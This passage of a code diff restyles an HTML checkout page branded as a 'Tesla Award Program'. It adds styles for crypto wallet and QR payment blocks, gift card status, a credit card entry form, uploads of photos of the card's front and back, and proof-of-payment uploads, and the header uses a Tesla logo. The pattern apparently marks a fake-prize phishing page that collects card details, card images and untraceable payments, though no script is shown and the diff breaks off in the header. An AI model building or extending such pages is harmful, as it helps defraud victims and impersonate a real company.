@@ -17,356 +17,954 @@
   <link rel="stylesheet" href="css/style.css">
   <style>
     :root {
+      --red: #E31937;
+      --red-dark: #c41030;
+      --red-glow: rgba(227,25,55,0.08);
+      --red-glow-md: rgba(227,25,55,0.15);
       --success: #00A550;
       --warning: #F59E0B;
       --danger: #EF4444;
-      --info: #3B82F6;
-      --pay-border: #E5E7EB;
-      --pay-radius: 16px;
-      --pay-shadow: 0 4px 12px rgba(0,0,0,0.07);
-      --pay-shadow-lg: 0 12px 40px rgba(0,0,0,0.1);
+      --dark: #0A0A0A;
+      --dark2: #171A20;
+      --gray: #5C5E62;
+      --gray2: #8E9099;
+      --gray3: #C4C7CC;
+      --border: #E5E7EB;
+      --border-light: #F3F4F6;
+      --bg: #F5F5F7;
+      --white: #FFFFFF;
+      --radius: 14px;
+      --radius-lg: 20px;
+      --shadow-sm: 0 2px 8px rgba(0,0,0,0.06);
+      --shadow: 0 4px 16px rgba(0,0,0,0.08);
+      --shadow-lg: 0 16px 48px rgba(0,0,0,0.12);
+      --ease: cubic-bezier(0.4,0,0.2,1);
     }
-    * { box-sizing: border-box; }
-    body{background:#f5f5f7;font-family:'Inter',-apple-system,sans-serif;color:#171A20;}
-
-    .page-wrap{max-width:820px;margin:0 auto;padding:88px 24px 64px;}
-    .page-card{background:white;border-radius:var(--pay-radius);box-shadow:var(--pay-shadow);border:1px solid var(--pay-border);padding:48px;}
-    @media(max-width:560px){.page-card{padding:24px 16px;border-radius:14px;}}
-
-    .page-title{font-size:28px;font-weight:900;color:#111;text-align:center;margin-bottom:4px;letter-spacing:-0.5px;}
-    .page-sub{font-size:15px;color:#666;text-align:center;line-height:1.65;margin-bottom:32px;}
-
-    /* Steps indicator */
-    .steps-bar{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:36px;flex-wrap:wrap;}
-    .s-step{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:#999;}
-    .s-step.done{color:var(--success);}
-    .s-step.active{color:#E31937;}
-    .s-circle{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;background:#eee;color:#999;}
-    .s-step.done .s-circle{background:var(--success);color:#fff;}
-    .s-step.active .s-circle{background:#E31937;color:#fff;}
-    .s-line{width:32px;height:2px;background:#eee;flex-shrink:0;}
-    .s-line.done{background:var(--success);}
-
-    /* Order Summary */
-    .summary-section{background:#f8f9fa;border-radius:14px;padding:24px 28px;margin-bottom:24px;border:1px solid rgba(0,0,0,.04);}
-    .summary-section h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:16px;}
-    .summary-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(0,0,0,.04);font-size:14px;}
-    .summary-row:last-child{border-bottom:none;}
-    .s-label{color:#777;}.s-value{color:#111;font-weight:600;text-align:right;}
-    .s-total{border-top:2px solid #ddd;padding-top:12px;margin-top:4px;}
-    .s-total .s-label{font-weight:700;color:#111;font-size:15px;}
-    .s-total .s-value{font-weight:900;color:#E31937;font-size:22px;}
-
-    /* Selected Payment Method Detail */
-    .pay-detail-card{
-      background:white;border-radius:14px;border:1.5px solid rgba(227,25,55,.15);padding:24px;
-      margin-bottom:24px;box-shadow:0 2px 12px rgba(227,25,55,.06);
-    }
-    .pay-detail-header{display:flex;align-items:center;gap:14px;margin-bottom:16px;}
-    .pay-big-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px;}
-    .pay-big-icon.wallet{background:rgba(0,48,135,.1);}.pay-big-icon.crypto{background:rgba(247,147,26,.1);}.pay-big-icon.card{background:rgba(59,130,246,.1);}.pay-big-icon.gift{background:rgba(239,68,68,.1);}
-    .pay-detail-title{font-size:18px;font-weight:800;color:#111;}
-    .pay-detail-sub{font-size:12px;color:#888;}
-
-    .wallet-address-box{
-      background:#f8f9fa;border:1px solid var(--pay-border);border-radius:12px;
-      padding:16px;display:flex;align-items:center;gap:12px;margin-bottom:16px;
-      word-break:break-all;font-family:'Courier New',monospace;font-size:13px;color:#333;
-    }
-    .wallet-address-box .copy-btn{
-      flex-shrink:0;background:#E31937;color:white;border:none;border-radius:8px;
-      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;
-      white-space:nowrap;font-family:inherit;
-    }
-    .wallet-address-box .copy-btn:hover{background:#c41030;}
-    .wallet-address-box .copy-btn.copied{background:var(--success);}
-
-    .qr-placeholder{
-      width:160px;height:160px;background:#f8f9fa;border-radius:12px;
-      display:flex;align-items:center;justify-content:center;
-      margin:0 auto 16px;border:2px dashed var(--pay-border);
-      font-size:48px;color:#ccc;
-    }
-    .qr-placeholder img{width:100%;height:100%;object-fit:contain;border-radius:10px;}
-
-    .instructions-box{
-      background:#FFF8F0;border:1px solid rgba(245,158,11,.2);border-radius:12px;
-      padding:16px 20px;font-size:14px;color:#92400E;line-height:1.7;margin-bottom:16px;
-    }
-    .instructions-box strong{color:#111;}
-
-    /* Payment Proof Upload */
-    .upload-area{
-      border:2px dashed var(--pay-border);border-radius:14px;padding:32px;
-      text-align:center;cursor:pointer;transition:all .25s;margin-bottom:20px;
-      background:#FAFBFC;
-    }
-    .upload-area:hover{border-color:#E31937;background:rgba(227,25,55,.03);}
-    .upload-area.dragover{border-color:#E31937;background:rgba(227,25,55,.06);}
-    .upload-area.has-file{border-color:var(--success);background:rgba(0,165,80,.04);}
-    .upload-icon{font-size:48px;margin-bottom:12px;opacity:.5;}
-    .upload-title{font-size:16px;font-weight:700;color:#111;margin-bottom:4px;}
-    .upload-hint{font-size:13px;color:#888;margin-bottom:16px;}
-    .upload-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
-    .upload-btn{
-      display:inline-flex;align-items:center;gap:8px;padding:10px 22px;
-      border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;
-      border:1.5px solid var(--pay-border);background:white;color:#555;
-      transition:all .2s;font-family:inherit;
-    }
-    .upload-btn:hover{border-color:#E31937;color:#E31937;background:rgba(227,25,55,.04);}
-    .upload-btn.primary{background:#E31937;color:white;border-color:#E31937;}
-    .upload-btn.primary:hover{background:#c41030;}
-    .upload-preview{display:none;margin-top:16px;}
-    .upload-preview.show{display:block;}
-    .upload-preview img{max-width:100%;max-height:200px;border-radius:10px;box-shadow:0 2px 12px rgba(0,0,0,.1);}
-    .upload-preview .file-name{font-size:13px;color:#555;margin-top:8px;font-weight:600;}
-    .upload-preview .file-size{font-size:11px;color:#999;}
-
-    /* Other payment methods */
-    .other-methods{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:24px;}
-    .other-method-card{
-      background:white;border:1.5px solid var(--pay-border);border-radius:12px;
-      padding:14px;text-align:center;cursor:pointer;transition:all .2s;
-    }
-    .other-method-card:hover{border-color:rgba(227,25,55,.3);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.06);}
-    .other-method-card.selected{border-color:#E31937;background:rgba(227,25,55,.04);}
-    .other-method-card .om-icon{font-size:28px;margin-bottom:6px;}
-    .other-method-card .om-name{font-size:13px;font-weight:700;color:#111;}
-    .other-method-card .om-badge{
-      display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;
-      border-radius:999px;margin-top:4px;
-    }
-    .other-method-card .om-badge.selected-badge{background:#E31937;color:#fff;}
-    .other-method-card .om-badge.disabled-badge{background:#eee;color:#999;}
-
-    /* Notification toggle for admin */
-    .notif-bar{
-      display:flex;align-items:center;justify-content:space-between;
-      background:#f0f7ff;border:1px solid rgba(59,130,246,.15);border-radius:12px;
-      padding:14px 18px;margin-bottom:20px;
-    }
-    .notif-bar .notif-text{font-size:13px;color:var(--info);font-weight:600;}
-    .notif-bar .notif-btn{
-      background:var(--info);color:white;border:none;border-radius:8px;
-      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;
-      transition:all .2s;font-family:inherit;
-    }
-    .notif-bar .notif-btn:hover{background:#2563EB;}
-    .notif-bar .notif-btn.subscribed{background:var(--success);}
-
-    .security-row{display:flex;align-items:center;gap:8px;justify-content:center;margin-top:20px;font-size:12px;color:#999;}
-
-    @media(max-width:560px){
-      .page-title{font-size:22px;}.page-sub{font-size:14px;}
-      .wallet-address-box{flex-direction:column;align-items:stretch;}
-      .upload-actions{flex-direction:column;align-items:stretch;}
-      .other-methods{grid-template-columns:repeat(2,1fr);}
-      .steps-bar{gap:4px;}.s-line{width:16px;}
+    *, *::before, *::after { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--dark2);
+      margin: 0;
+      padding: 0;
+      -webkit-font-smoothing: antialiased;
     }
 
-    /* Modal */
-    .modal-overlay{position:fixed;inset:0;z-index:99998;background:rgba(23,26,32,.6);display:flex;align-items:center;justify-content:center;animation:fadeIn .15s ease;backdrop-filter:blur(4px);padding:20px;}
-    .modal-card{background:white;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.2);padding:32px 28px;max-width:440px;width:100%;animation:modalIn .2s ease;text-align:center;}
-    .modal-card h3{font-size:18px;font-weight:800;color:#111;margin:0 0 6px;}
-    .modal-card p{font-size:14px;color:#666;margin:0 0 20px;line-height:1.6;}
-    .modal-card .btn{min-width:120px;}
-    .modal-actions{display:flex;gap:10px;justify-content:center;}
+    /* ── Topbar ─────────────────────────────────────────────── */
+    .topbar {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background: rgba(255,255,255,0.92);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      height: 64px;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 28px;
+    }
+    .topbar-brand {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 16px; font-weight: 800; color: var(--dark);
+      letter-spacing: -0.3px; text-decoration: none;
+    }
+    .topbar-brand img { height: 28px; }
+    .topbar-brand-text { display: flex; flex-direction: column; }
+    .topbar-brand-sub { font-size: 10px; font-weight: 500; color: var(--gray2); letter-spacing: 0.06em; text-transform: uppercase; }
+    .topbar-secure {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 12px; font-weight: 600; color: var(--success);
+      background: rgba(0,165,80,0.08);
+      padding: 6px 12px; border-radius: 20px;
+    }
 
-    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
-    @keyframes modalIn{from{opacity:0;transform:scale(.95) translateY(10px);}to{opacity:1;transform:scale(1) translateY(0);}}
-    @keyframes slideInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+    /* ── Page Layout ────────────────────────────────────────── */
+    .page-wrap { max-width: 900px; margin: 0 auto; padding: 88px 20px 80px; }
 
-    .btn{display:inline-flex;align-items:center;gap:6px;justify-content:center;font-family:inherit;border:none;cursor:pointer;font-weight:600;transition:all .22s ease;border-radius:10px;font-size:14px;padding:12px 24px;white-space:nowrap;}
-    .btn-primary{background:#E31937;color:white;}.btn-primary:hover{background:#b5102a;box-shadow:0 8px 28px rgba(227,25,55,.32);}
-    .btn-ghost{background:transparent;color:#555;border:1.5px solid var(--pay-border);}.btn-ghost:hover{background:rgba(0,0,0,.03);border-color:#999;}
-    .btn-success{background:var(--success);color:white;}
-    .btn-danger{background:var(--danger);color:white;}
-    .btn-full{width:100%;}
-    .btn-lg{padding:14px 32px;font-size:16px;}
-    .btn-sm{font-size:12px;padding:8px 16px;}
-    .btn:disabled{opacity:.5;cursor:not-allowed;}
+    /* ── Steps ──────────────────────────────────────────────── */
+    .steps-bar {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0; margin-bottom: 40px;
+    }
+    .step-item {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 12px; font-weight: 600;
+    }
+    .step-circle {
+      width: 30px; height: 30px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700;
+      background: var(--border); color: var(--gray2);
+      flex-shrink: 0; transition: all 0.2s;
+    }
+    .step-item.done .step-circle { background: var(--success); color: #fff; }
+    .step-item.active .step-circle { background: var(--red); color: #fff; box-shadow: 0 0 0 4px rgba(227,25,55,0.15); }
+    .step-label { color: var(--gray2); }
+    .step-item.done .step-label { color: var(--success); }
+    .step-item.active .step-label { color: var(--red); }
+    .step-connector {
+      width: 48px; height: 2px; background: var(--border);
+      margin: 0 4px; flex-shrink: 0;
+    }
+    .step-connector.done { background: var(--success); }
+    @media (max-width: 480px) {
+      .step-label { display: none; }
+      .step-connector { width: 24px; }
+    }
+
+    /* ── Section Label ──────────────────────────────────────── */
+    .section-label {
+      font-size: 11px; font-weight: 700; text-transform: uppercase;
+      letter-spacing: 0.08em; color: var(--gray2); margin-bottom: 14px;
+    }
+
+    /* ── Page Header ────────────────────────────────────────── */
+    .page-header { text-align: center; margin-bottom: 36px; }
+    .page-title { font-size: 32px; font-weight: 900; color: var(--dark); margin: 0 0 8px; letter-spacing: -0.8px; line-height: 1.1; }
+    .page-subtitle { font-size: 15px; color: var(--gray); line-height: 1.65; margin: 0; }
+
+    /* ── Grid Layout ────────────────────────────────────────── */
+    .main-grid {
+      display: grid;
+      grid-template-columns: 1fr 340px;
+      gap: 24px;
+      align-items: start;
+    }
+    @media (max-width: 760px) {
+      .main-grid { grid-template-columns: 1fr; }
+      .sidebar-col { order: -1; }
+    }
+
+    /* ── Card ───────────────────────────────────────────────── */
+    .card {
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-sm);
+      overflow: hidden;
+    }
+    .card-header {
+      padding: 20px 24px 16px;
+      border-bottom: 1px solid var(--border-light);
+      display: flex; align-items: center; gap: 10px;
+    }
+    .card-header-icon {
+      width: 36px; height: 36px; border-radius: 10px;
+      background: var(--red-glow); display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .card-header h2 { font-size: 15px; font-weight: 700; margin: 0; color: var(--dark); }
+    .card-header p { font-size: 12px; color: var(--gray2); margin: 2px 0 0; }
+    .card-body { padding: 20px 24px; }
+    @media (max-width: 480px) { .card-body { padding: 16px; } .card-header { padding: 16px; } }
+
+    /* ── Order Summary ──────────────────────────────────────── */
+    .summary-row {
+      display: flex; justify-content: space-between; align-items: flex-start;
+      padding: 10px 0; border-bottom: 1px solid var(--border-light);
+      gap: 12px; font-size: 13.5px;
+    }
+    .summary-row:last-child { border-bottom: none; }
+    .sr-label { color: var(--gray); font-weight: 500; flex-shrink: 0; }
+    .sr-value { color: var(--dark2); font-weight: 600; text-align: right; }
+    .summary-total {
+      background: linear-gradient(135deg, var(--dark2) 0%, #2a2d35 100%);
+      border-radius: 12px;
+      padding: 16px 20px;
+      margin-top: 16px;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .summary-total-label { font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7); }
+    .summary-total-amount { font-size: 24px; font-weight: 900; color: var(--white); letter-spacing: -0.5px; }
+
+    /* ── Payment Method Grid ────────────────────────────────── */
+    .pm-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+    .pm-card {
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      padding: 12px 8px;
+      cursor: pointer;
+      text-align: center;
+      background: var(--white);
+      transition: all 0.2s var(--ease);
+      display: flex; flex-direction: column; align-items: center; gap: 6px;
+    }
+    .pm-card:hover { border-color: var(--red); transform: translateY(-2px); box-shadow: var(--shadow); }
+    .pm-card.selected {
+      border-color: var(--red);
+      background: var(--red-glow);
+      box-shadow: 0 0 0 3px var(--red-glow-md);
+    }
+    .pm-card-logo { width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; }
+    .pm-card-logo img, .pm-card-logo svg { max-width: 34px; max-height: 34px; object-fit: contain; }
+    .pm-card-name { font-size: 10.5px; font-weight: 600; color: var(--dark2); line-height: 1.3; }
+    .pm-card.selected .pm-card-name { color: var(--red); }
+    .pm-selected-badge {
+      display: inline-block;
+      background: var(--red);
+      color: white;
+      font-size: 9px; font-weight: 700;
+      border-radius: 10px;
+      padding: 2px 6px;
+      letter-spacing: 0.03em;
+    }
+
+    /* ── Payment Detail ─────────────────────────────────────── */
+    .pay-detail-card {
+      border: 1.5px solid var(--red-glow-md);
+      border-radius: var(--radius);
+      padding: 20px;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, rgba(227,25,55,0.02) 0%, rgba(255,255,255,1) 100%);
+    }
+    .pay-detail-header {
+      display: flex; align-items: center; gap: 14px; margin-bottom: 16px;
+    }
+    .pay-method-icon {
+      width: 52px; height: 52px; border-radius: 14px;
+      background: var(--border-light);
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden; flex-shrink: 0;
+    }
+    .pay-method-icon img { max-width: 40px; max-height: 40px; object-fit: contain; }
+    .pay-method-name { font-size: 17px; font-weight: 800; color: var(--dark); margin: 0 0 2px; }
+    .pay-method-type {
+      display: inline-flex; align-items: center; gap: 4px;
+      font-size: 11px; font-weight: 600; color: var(--gray2);
+      text-transform: uppercase; letter-spacing: 0.06em;
+    }
+
+    .pay-info-row {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 10px 14px;
+      background: var(--border-light);
+      border-radius: 10px;
+      margin-bottom: 8px;
+    }
+    .pay-info-icon { flex-shrink: 0; color: var(--gray2); margin-top: 1px; }
+    .pay-info-content { flex: 1; min-width: 0; }
+    .pay-info-label { font-size: 10.5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--gray2); margin-bottom: 2px; }
+    .pay-info-value {
+      font-size: 14px; font-weight: 700; color: var(--dark);
+      word-break: break-all;
+    }
+    .copy-btn {
+      flex-shrink: 0; display: inline-flex; align-items: center; justify-content: center;
+      width: 30px; height: 30px;
+      border: 1px solid var(--border); border-radius: 8px;
+      background: var(--white); color: var(--gray2); cursor: pointer;
+      transition: all 0.15s; font-family: inherit;
+    }
+    .copy-btn:hover { border-color: var(--red); color: var(--red); }
+
+    .instructions-box {
+      background: rgba(59,130,246,0.06);
+      border: 1px solid rgba(59,130,246,0.15);
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-top: 12px;
+      font-size: 13px;
+      color: var(--dark2);
+      line-height: 1.65;
+    }
+    .instructions-box-label {
+      font-size: 10.5px; font-weight: 700; text-transform: uppercase;
+      letter-spacing: 0.06em; color: rgba(59,130,246,0.8); margin-bottom: 6px;
+    }
+
+    /* QR Code */
+    .qr-block {
+      display: flex; justify-content: center;
+      padding: 12px 0;
+    }
+    .qr-block img {
+      max-width: 160px; border-radius: 12px;
+      border: 3px solid var(--border); padding: 8px; background: white;
+    }
+
+    /* ── Credit Card Form ───────────────────────────────────── */
+    .cc-form-section {
+      display: none;
+      margin-bottom: 20px;
+    }
+    .cc-form-section.visible { display: block; }
+    .cc-form-title {
+      font-size: 13px; font-weight: 700; color: var(--dark);
+      margin-bottom: 14px; display: flex; align-items: center; gap: 8px;
+    }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
+    .form-row.single { grid-template-columns: 1fr; }
+    .form-row.thirds { grid-template-columns: 2fr 1fr 1fr; }
+    @media (max-width: 480px) {
+      .form-row, .form-row.thirds { grid-template-columns: 1fr; }
+    }
+    .form-field { display: flex; flex-direction: column; gap: 5px; }
+    .form-label {
+      font-size: 11px; font-weight: 600; color: var(--gray);
+      text-transform: uppercase; letter-spacing: 0.05em;
+    }
+    .form-input {
+      height: 44px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      padding: 0 14px;
+      font-size: 14px;
+      font-family: inherit;
+      color: var(--dark);
+      background: var(--white);
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      width: 100%;
+    }
+    .form-input:focus {
+      border-color: var(--red);
+      box-shadow: 0 0 0 3px var(--red-glow);
+    }
+    .form-input::placeholder { color: var(--gray3); }
+    .form-input.card-number { letter-spacing: 0.1em; font-weight: 600; }
+
+    /* Card number visual formatting */
+    .card-visual {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      border-radius: 16px;
+      padding: 20px 24px;
+      margin-bottom: 16px;
+      position: relative;
+      overflow: hidden;
+    }
+    .card-visual::before {
+      content: '';
+      position: absolute; top: -30px; right: -30px;
+      width: 120px; height: 120px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.05);
+    }
+    .card-visual::after {
+      content: '';
+      position: absolute; bottom: -40px; right: 20px;
+      width: 160px; height: 160px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.03);
+    }
+    .card-visual-number {
+      font-size: 18px; font-weight: 700; color: rgba(255,255,255,0.9);
+      letter-spacing: 0.18em; margin: 8px 0 16px;
+      font-variant-numeric: tabular-nums;
+    }
+    .card-visual-row { display: flex; justify-content: space-between; align-items: flex-end; }
+    .card-visual-label { font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: rgba(255,255,255,0.4); margin-bottom: 3px; }
+    .card-visual-value { font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.85); }
+    .card-visual-logo { display: flex; align-items: center; gap: 2px; }
+    .card-circle {
+      width: 28px; height: 28px; border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+    }
+    .card-circle:last-child { background: rgba(255,255,255,0.35); margin-left: -10px; }
+
+    /* ── CC Image Upload ────────────────────────────────────── */
+    .cc-upload-section {
+      display: none;
+      margin-top: 16px;
+    }
+    .cc-upload-section.visible { display: block; }
+    .cc-upload-header {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 13px; font-weight: 700; color: var(--dark);
+      margin-bottom: 6px;
+    }
+    .cc-upload-hint {
+      font-size: 12px; color: var(--gray2); margin-bottom: 14px; line-height: 1.5;
+    }
+    .upload-cards-grid {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 14px;
+    }
+    @media (max-width: 400px) { .upload-cards-grid { grid-template-columns: 1fr; } }
+
+    /* ── Upload Card (reused for Gift + CC) ─────────────────── */
+    .upload-card {
+      border: 2px dashed var(--border);
+      border-radius: 14px;
+      padding: 20px 14px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s var(--ease);
+      background: var(--white);
+      position: relative;
+      min-height: 160px;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .upload-card:hover { border-color: var(--red); background: var(--red-glow); }
+    .upload-card.has-file { border-style: solid; border-color: var(--success); background: rgba(0,165,80,0.04); }
+    .upload-card-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      background: var(--border-light);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 10px; color: var(--gray2);
+      transition: all 0.2s;
+    }
+    .upload-card:hover .upload-card-icon { background: rgba(227,25,55,0.1); color: var(--red); }
+    .upload-card.has-file .upload-card-icon { background: rgba(0,165,80,0.1); color: var(--success); }
+    .upload-card-side {
+      font-size: 13px; font-weight: 700; color: var(--dark); margin-bottom: 3px;
+    }
+    .upload-card-hint { font-size: 11px; color: var(--gray2); line-height: 1.4; }
+    .upload-card-btn {
+      display: inline-flex; align-items: center; gap: 6px;
+      margin-top: 12px;
+      padding: 7px 14px;
+      border-radius: 8px;
+      font-size: 12px; font-weight: 600; font-family: inherit;
+      border: 1.5px solid var(--border);
+      background: var(--white); color: var(--dark2);
+      cursor: pointer; transition: all 0.15s;
+    }
+    .upload-card-btn:hover { border-color: var(--red); color: var(--red); }
+    .upload-card-preview {
+      display: none;
+      flex-direction: column; align-items: center; gap: 8px;
+      width: 100%;
+    }
+    .upload-card.has-file .upload-card-preview { display: flex; }
+    .upload-card.has-file .upload-card-placeholder { display: none; }
+    .upload-card-preview img {
+      max-width: 100%; max-height: 120px;
+      border-radius: 8px;
+      box-shadow: var(--shadow-sm);
+      object-fit: contain;
+    }
+    .upload-card-preview-name {
+      font-size: 11px; color: var(--gray); font-weight: 500;
+      word-break: break-all; max-width: 100%; text-align: center;
+    }
+    .upload-card-replace {
+      display: inline-flex; align-items: center; gap: 5px;
+      font-size: 11px; font-weight: 600; color: var(--gray2);
+      background: none; border: 1px solid var(--border);
+      border-radius: 6px; padding: 4px 10px; cursor: pointer;
+      font-family: inherit; transition: all 0.15s;
+    }
+    .upload-card-replace:hover { border-color: var(--red); color: var(--red); }
+    .upload-card-placeholder { display: flex; flex-direction: column; align-items: center; width: 100%; }
+
+    /* ── Proof Upload ───────────────────────────────────────── */
+    .proof-upload-area {
+      border: 2px dashed var(--border);
+      border-radius: var(--radius);
+      padding: 32px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s var(--ease);
+      background: var(--white);
+      margin-bottom: 16px;
+    }
+    .proof-upload-area:hover { border-color: var(--red); background: var(--red-glow); }
+    .proof-upload-area.has-file { border-style: solid; border-color: var(--success); background: rgba(0,165,80,0.04); cursor: default; }
+    .proof-upload-icon { color: var(--gray3); margin-bottom: 12px; }
+    .proof-upload-title { font-size: 15px; font-weight: 700; color: var(--dark); margin-bottom: 4px; }
+    .proof-upload-hint { font-size: 13px; color: var(--gray2); line-height: 1.5; margin-bottom: 14px; }
+    .proof-upload-btn {
+      display: inline-flex; align-items: center; gap: 7px;
+      padding: 10px 20px;
+      border-radius: 10px; font-size: 13px; font-weight: 600;
+      border: 1.5px solid var(--border);
+      background: var(--white); color: var(--dark2);
+      cursor: pointer; font-family: inherit; transition: all 0.15s;
+    }
+    .proof-upload-btn:hover { border-color: var(--red); color: var(--red); }
+    .proof-preview-wrap {
+      display: flex; flex-direction: column; align-items: center; gap: 10px;
+    }
+    .proof-preview-img {
+      max-width: 100%; max-height: 200px;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      object-fit: contain;
+    }
+    .proof-preview-meta {
+      font-size: 13px; font-weight: 500; color: var(--gray);
+      display: flex; align-items: center; gap: 6px;
+    }
+    .proof-actions { display: flex; gap: 10px; margin-top: 4px; }
+    .proof-status-msg {
+      text-align: center;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 10px 14px;
+      border-radius: 10px;
+      margin-bottom: 14px;
+    }
+
+    /* ── Submit Button ───────────────────────────────────────── */
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      border-radius: 12px;
+      border: none;
+      font-size: 15px; font-weight: 700; font-family: inherit;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      transition: all 0.2s var(--ease);
+      background: var(--red);
+      color: white;
+      box-shadow: 0 4px 16px rgba(227,25,55,0.3);
+    }
+    .btn-submit:hover:not(:disabled) {
+      background: var(--red-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(227,25,55,0.4);
+    }
+    .btn-submit:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    /* ── Security Row ───────────────────────────────────────── */
+    .security-row {
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-size: 11.5px; font-weight: 500; color: var(--gray2);
+      margin-top: 14px;
+    }
+
+    /* ── Generic Buttons ────────────────────────────────────── */
+    .btn {
+      display: inline-flex; align-items: center; gap: 6px;
+      border-radius: 10px; font-size: 13px; font-weight: 600;
+      padding: 9px 16px; border: none; cursor: pointer;
+      font-family: inherit; transition: all 0.15s var(--ease);
+    }
+    .btn-ghost {
+      background: none; color: var(--gray2);
+      border: 1.5px solid var(--border);
+    }
+    .btn-ghost:hover { border-color: var(--red); color: var(--red); background: var(--red-glow); }
+    .btn-success {
+      background: var(--success); color: white;
+      box-shadow: 0 2px 8px rgba(0,165,80,0.3);
+    }
+    .btn-success:hover { background: #008f44; }
+    .btn-sm { padding: 6px 12px; font-size: 12px; }
+
+    /* ── Upload Status Banner ───────────────────────────────── */
+    .upload-status {
+      display: none; padding: 12px 16px; border-radius: 10px;
+      font-size: 13px; font-weight: 600; text-align: center; margin-bottom: 14px;
+    }
+
+    /* ── Empty / Loading ────────────────────────────────────── */
+    .pm-empty {
+      grid-column: 1 / -1; text-align: center; padding: 28px 20px;
+      color: var(--gray2); font-size: 14px;
+    }
+
+    /* ── Toast ──────────────────────────────────────────────── */
+    @keyframes slideInRight {
+      from { opacity: 0; transform: translateX(24px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    /* ── Divider ─────────────────────────────────────────────── */
+    .divider { height: 1px; background: var(--border-light); margin: 16px 0; }
+
+    /* ── Gift Card Status ────────────────────────────────────── */
+    .gift-status { margin-top: 14px; }
+    .gift-status-msg {
+      text-align: center; font-size: 13px; font-weight: 600;
+      padding: 10px 14px; border-radius: 10px;
+    }
+
+    /* ── Responsive tweaks ──────────────────────────────────── */
+    @media (max-width: 640px) {
+      .page-title { font-size: 24px; }
+    }
   </style>
 </head>
 <body>
 
-<nav class="nav">
-  <div class="nav-inner">
-    <a href="index.html" class="nav-logo">
-      <img src="assets/tesla-award-logo.svg" alt="Tesla" style="height:20px;width:auto;vertical-align:middle">
-      TESLA
-    </a>
-    <div style="display:flex;align-items:center;gap:12px;">
-      <span style="font-size:12px;color:#888;">Step 4 of 4</span>
-      <a href="delivery-method.html" class="btn btn-ghost btn-sm">← Back</a>
+<!-- TOPBAR -->
+<header class="topbar">
+  <a class="topbar-brand" href="dashboard.html">
+    <img src="assets/tesla-award-logo.svg" alt="Tesla" onerror="this.style.display='none'">
+    <div class="topbar-brand-text">
+      <span>Tesla Award Program</span>
+      <span class="topbar-brand-sub">Secure Checkout</span>
     </div>
+  </a>
+  <div class="topbar-secure">
